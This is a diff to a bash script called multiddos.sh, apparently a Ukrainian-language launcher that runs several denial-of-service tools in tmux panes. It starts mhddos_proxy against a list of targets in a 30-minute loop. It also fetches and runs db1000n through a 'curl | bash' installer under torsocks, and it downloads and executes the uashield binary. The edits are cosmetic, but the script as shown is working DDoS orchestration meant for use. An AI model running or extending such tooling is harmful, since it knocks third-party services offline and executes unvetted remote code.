@@ -87,6 +87,7 @@ echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq |
 echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
 sleep 5
+clear
 }
 export -f prepare_targets_and_banner
 
@@ -109,26 +110,20 @@ if [[ $gotop == "on" ]]; then
     tmux new-session -s multiddos -d 'gotop -sc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
-else 
-    if [[ $matrix == "on" ]]; then
-        tmux new-session -s multiddos -d 'cmatrix'
-        sleep 0.2
-        tmux split-window -h -p 66 'bash auto_bash.sh'
-    else
-        sleep 0.2
-        tmux new-session -s multiddos -d 'bash auto_bash.sh'
-    fi
+else
+    sleep 0.2
+    tmux new-session -s multiddos -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
-sudo apt install vnstat
-#sleep 0.2
+sudo apt -yq install vnstat
+sleep 0.2
 tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
 sudo apt -yq install torsocks
-#sleep 0.2
+sleep 0.2
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
@@ -137,12 +132,6 @@ sleep 0.2
 tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
-if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
-sleep 0.2
-tmux select-pane -t 0
-sleep 0.2
-tmux split-window -v 'cmatrix'
-fi
 #tmux -2 attach-session -d
 }
 
@@ -152,7 +141,6 @@ usage: bash multiddos.sh [+d|+u|-t|+m|-h]
                           -g | --gotop        - disable gotop
                           +d | --db1000n      - enable db1000n
                           +u | --uashield     - enable uashield
-                          +m | --matrix       - enable matrix
                           +v | --vnstat       - enable vnstat -l (traffic monitoring)
                           -t | --threads      - threads
                           -h | --help         - brings up this menu
@@ -215,7 +203,6 @@ sleep 2
         python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $methods&
 sleep 30m
 prepare_targets_and_banner
-clear
 done
 EOF
 
